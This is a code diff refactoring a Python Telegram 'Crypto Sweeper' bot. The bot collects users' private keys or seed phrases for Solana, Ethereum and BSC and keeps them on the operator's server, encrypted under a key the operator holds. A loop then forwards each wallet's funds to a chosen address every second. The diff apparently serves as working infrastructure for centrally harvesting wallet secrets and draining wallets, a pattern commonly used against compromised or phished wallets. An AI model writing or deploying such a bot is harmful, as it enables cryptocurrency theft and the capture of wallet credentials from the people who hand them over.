@@ -25,7 +25,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 DATA_FILE = "wallets.json"
-TX_LOG_FILE = "transactions.json"   # New: simple transaction log
+TX_LOG_FILE = "transactions.json"
 SECRET_KEY = os.getenv("SECRET_KEY")
 PORT = int(os.getenv("PORT", 5000))
 
@@ -35,8 +35,8 @@ if not SECRET_KEY or not TELEGRAM_BOT_TOKEN:
 cipher = Fernet(SECRET_KEY.encode())
 
 # ---------------- STORAGE ----------------
-data_store = {}      # user wallets
-tx_log = []          # recent transactions
+data_store = {}
+tx_log = []
 data_lock = Lock()
 
 def encrypt(data: str) -> str:
@@ -49,18 +49,17 @@ def load_data():
     global data_store, tx_log
     if os.path.exists(DATA_FILE):
         try:
-            with open(DATA_FILE, "r") as f:
-                raw = json.load(f)
-                data_store = {int(k): v for k, v in raw.items()}
+            with open(DATA_FILE) as f:
+                data_store = {int(k): v for k, v in json.load(f).items()}
         except Exception as e:
-            logger.error(f"Failed to load wallets: {e}")
+            logger.error(f"Load wallets error: {e}")
 
     if os.path.exists(TX_LOG_FILE):
         try:
-            with open(TX_LOG_FILE, "r") as f:
+            with open(TX_LOG_FILE) as f:
                 tx_log = json.load(f)
         except:
-            tx_log = []
+            pass
 
 def save_data():
     try:
@@ -68,20 +67,17 @@ def save_data():
             with open(DATA_FILE, "w") as f:
                 json.dump(data_store, f, indent=2)
             with open(TX_LOG_FILE, "w") as f:
-                json.dump(tx_log[-100:], f, indent=2)  # keep last 100 tx
+                json.dump(tx_log[-100:], f, indent=2)
     except Exception as e:
-        logger.error(f"Failed to save: {e}")
+        logger.error(f"Save error: {e}")
 
-def log_transaction(user_id, chain, status, amount=None, tx_hash=None):
-    tx = {
+def log_transaction(user_id, chain, status):
+    tx_log.append({
         "time": datetime.utcnow().isoformat(),
         "user_id": user_id,
         "chain": chain,
-        "status": status,
-        "amount": amount,
-        "tx_hash": tx_hash
-    }
-    tx_log.append(tx)
+        "status": status
+    })
     save_data()
 
 # ---------------- FLASK ----------------
@@ -92,102 +88,103 @@ def home():
 # ---------------- STATES ----------------
 CHAIN, SECRET, DESTINATION = range(3)
 
-# ---------------- KEYBOARDS ----------------
 def main_menu():
     keyboard = [
-        [InlineKeyboardButton("➕ Add Wallet", callback_data="add_wallet")],
+        [InlineKeyboardButton("➕ Add New Wallet", callback_data="add_wallet")],
         [InlineKeyboardButton("📂 My Wallets", callback_data="my_wallets")],
-        [InlineKeyboardButton("🗑 Remove Last Wallet", callback_data="remove_wallet")],
-        [InlineKeyboardButton("📜 Recent Transactions", callback_data="transactions")]
+        [InlineKeyboardButton("🗑 Remove Last", callback_data="remove_last")],
+        [InlineKeyboardButton("📜 Transactions", callback_data="tx_history")]
     ]
     return InlineKeyboardMarkup(keyboard)
 
 # ---------------- HANDLERS ----------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "⚡ **High-Performance Crypto Sweeper**\n\n"
-        "Choose an option below:",
-        reply_markup=main_menu(),
-        parse_mode="Markdown"
-    )
+    await update.message.reply_text("⚡ **Crypto Sweeper Bot**", 
+                                  parse_mode="Markdown", 
+                                  reply_markup=main_menu())
 
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def main_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
 
     if query.data == "add_wallet":
-        return await choose_chain(update, context)
-    elif query.data == "my_wallets":
-        return await show_wallets(update, context)
-    elif query.data == "remove_wallet":
-        return await remove_last_wallet(update, context)
-    elif query.data == "transactions":
-        return await show_transactions(update, context)
+        keyboard = [
+            [InlineKeyboardButton("Solana", callback_data="solana")],
+            [InlineKeyboardButton("Ethereum", callback_data="ethereum")],
+            [InlineKeyboardButton("BSC", callback_data="bsc")]
+        ]
+        await query.edit_message_text("**Select Chain:**", parse_mode="Markdown",
+                                    reply_markup=InlineKeyboardMarkup(keyboard))
+        return CHAIN
 
-# Add Wallet Flow
-async def choose_chain(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [
-        [InlineKeyboardButton("Solana", callback_data="solana")],
-        [InlineKeyboardButton("Ethereum", callback_data="ethereum")],
-        [InlineKeyboardButton("BSC", callback_data="bsc")]
-    ]
-    await update.callback_query.edit_message_text("Select Chain:", reply_markup=InlineKeyboardMarkup(keyboard))
-    return CHAIN
+    elif query.data == "my_wallets":
+        await show_wallets(query)
+        return ConversationHandler.END
+    elif query.data == "remove_last":
+        await remove_last(query)
+        return ConversationHandler.END
+    elif query.data == "tx_history":
+        await show_transactions(query)
+        return ConversationHandler.END
 
 async def chain_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     context.user_data["chain"] = query.data
-    await query.edit_message_text(f"✅ Selected: **{query.data.upper()}**\n\nSend your **Private Key** or **Seed Phrase**:")
+    await query.edit_message_text(f"✅ Selected **{query.data.upper()}**\n\nSend your Private Key or Seed Phrase:")
     return SECRET
 
 async def receive_secret(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["secret"] = update.message.text.strip()
-    await update.message.reply_text("Now send the **Destination Wallet Address**:")
+    await update.message.reply_text("Now send the **Destination Address**:")
     return DESTINATION
 
 async def receive_destination(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    destination = update.message.text.strip()
+    user_id = update.effective_user.id
     chain = context.user_data["chain"]
     secret = context.user_data["secret"]
-    wallet_type = "seed" if len(secret.split()) > 2 else "private_key"
+    dest = update.message.text.strip()
 
-    user_id = update.effective_user.id
-    wallet = {"chain": chain, "type": wallet_type, "secret": encrypt(secret), "destination": destination}
+    wallet_type = "seed" if " " in secret else "private_key"
+
+    wallet = {
+        "chain": chain,
+        "type": wallet_type,
+        "secret": encrypt(secret),
+        "destination": dest
+    }
 
     with data_lock:
         data_store.setdefault(user_id, []).append(wallet)
         save_data()
 
     await update.message.reply_text(
-        f"✅ **Wallet Added Successfully!**\n"
-        f"Chain: {chain.upper()}\nType: {wallet_type}\nDestination: `{destination}`",
+        f"✅ **Wallet Added!**\nChain: {chain.upper()}\nType: {wallet_type}\nDest: `{dest}`",
         parse_mode="Markdown",
         reply_markup=main_menu()
     )
     context.user_data.clear()
     return ConversationHandler.END
 
-# View Wallets
-async def show_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("Cancelled.", reply_markup=main_menu())
+    context.user_data.clear()
+    return ConversationHandler.END
+
+# Quick actions
+async def show_wallets(query):
     user_id = query.from_user.id
     with data_lock:
         wallets = data_store.get(user_id, [])
-
     if not wallets:
-        await query.edit_message_text("No wallets found.", reply_markup=main_menu())
+        await query.edit_message_text("No wallets yet.", reply_markup=main_menu())
         return
+    text = "📂 **Your Wallets**\n\n"
+    for i, w in enumerate(wallets, 1):
+        text += f"{i}. {w['chain'].upper()} → `{w['destination']}`\n"
+    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())
 
-    msg = "📂 **Your Wallets**\n\n"
-    for i, w in enumerate(wallets):
-        msg += f"{i+1}. **{w['chain'].upper()}** → `{w['destination']}` ({w['type']})\n"
-    
-    await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=main_menu())
-
-# Remove Wallet
-async def remove_last_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
+async def remove_last(query):
     user_id = query.from_user.id
     with data_lock:
         if user_id in data_store and data_store[user_id]:
@@ -195,66 +192,46 @@ async def remove_last_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE)
             if not data_store[user_id]:
                 del data_store[user_id]
             save_data()
-            await query.edit_message_text(f"🗑 Removed: **{removed['chain'].upper()}** wallet", 
+            await query.edit_message_text(f"🗑 Removed **{removed['chain'].upper()}** wallet", 
                                         parse_mode="Markdown", reply_markup=main_menu())
         else:
-            await query.edit_message_text("No wallets to remove.", reply_markup=main_menu())
+            await query.edit_message_text("Nothing to remove.", reply_markup=main_menu())
 
-# Transactions
-async def show_transactions(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
+async def show_transactions(query):
     user_id = query.from_user.id
-    
-    user_txs = [tx for tx in tx_log[-20:] if tx["user_id"] == user_id]  # last 20 for this user
-    
-    if not user_txs:
+    user_tx = [t for t in tx_log[-15:] if t["user_id"] == user_id]
+    if not user_tx:
         await query.edit_message_text("No transactions yet.", reply_markup=main_menu())
         return
-
-    msg = "📜 **Recent Transactions**\n\n"
-    for tx in reversed(user_txs):
-        msg += f"• {tx['time'][:19]} | **{tx['chain'].upper()}** | {tx['status']}\n"
-        if tx.get("tx_hash"):
-            msg += f"   Hash: `{tx['tx_hash'][:20]}...`\n"
-    await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=main_menu())
-
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu())
-    context.user_data.clear()
-    return ConversationHandler.END
+    text = "📜 **Recent Activity**\n\n"
+    for t in reversed(user_tx):
+        text += f"• {t['time'][:19]} | {t['chain'].upper()} | {t['status']}\n"
+    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())
 
 # ---------------- SWEEPER ----------------
-MAX_CONCURRENT = 10
+async def sweeper_loop():
+    logger.info("🚀 Sweeper loop started")
+    semaphore = asyncio.Semaphore(10)
+    while True:
+        tasks = []
+        with data_lock:
+            current = list(data_store.items())
+        for uid, wallets in current:
+            for w in wallets:
+                tasks.append(process_wallet(uid, w, semaphore))
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+        await asyncio.sleep(1)
 
 async def process_wallet(user_id, wallet, semaphore):
     async with semaphore:
         try:
             secret = decrypt(wallet["secret"])
-            chain_func = {"solana": solana.forward, "ethereum": ethereum.forward, "bsc": bsc.forward}[wallet["chain"]]
-            
-            # Call forward function (modify your chain functions to return amount + tx_hash if possible)
-            result = await asyncio.to_thread(chain_func, secret, wallet["destination"], user_id)
-            
-            # Log success (adjust according to your forward function return value)
+            func = {"solana": solana.forward, "ethereum": ethereum.forward, "bsc": bsc.forward}[wallet["chain"]]
+            await asyncio.to_thread(func, secret, wallet["destination"], user_id)
             log_transaction(user_id, wallet["chain"], "Success")
-            
         except Exception as e:
-            logger.error(f"Error processing wallet {user_id}: {e}")
-            log_transaction(user_id, wallet["chain"], f"Error: {str(e)[:50]}")
-
-async def sweeper_loop():
-    logger.info("🚀 Sweeper loop started")
-    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
-    while True:
-        tasks = []
-        with data_lock:
-            current = list(data_store.items())
-        for user_id, wallets in current:
-            for wallet in wallets:
-                tasks.append(process_wallet(user_id, wallet, semaphore))
-        if tasks:
-            await asyncio.gather(*tasks, return_exceptions=True)
-        await asyncio.sleep(1)
+            log_transaction(user_id, wallet["chain"], f"Failed: {str(e)[:80]}")
 
 # ---------------- MAIN ----------------
 async def main():
@@ -262,21 +239,21 @@ async def main():
     application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
 
     conv_handler = ConversationHandler(
-        entry_points=[CallbackQueryHandler(button_handler)],
+        entry_points=[CommandHandler("start", start),
+                      CallbackQueryHandler(main_button)],
         states={
             CHAIN: [CallbackQueryHandler(chain_selected)],
             SECRET: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_secret)],
             DESTINATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_destination)],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
+        per_message=False
     )
 
-    application.add_handler(CommandHandler("start", start))
     application.add_handler(conv_handler)
 
     asyncio.create_task(sweeper_loop())
 
-    logger.info("🤖 Telegram bot starting...")
     await application.initialize()
     await application.start()
     await application.updater.start_polling(drop_pending_updates=True)
@@ -284,9 +261,8 @@ async def main():
 
 if __name__ == "__main__":
     logger.info(f"Starting on port {PORT}")
-    flask_thread = threading.Thread(
+    threading.Thread(
         target=lambda: app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False),
         daemon=True
-    )
-    flask_thread.start()
+    ).start()
     asyncio.run(main())
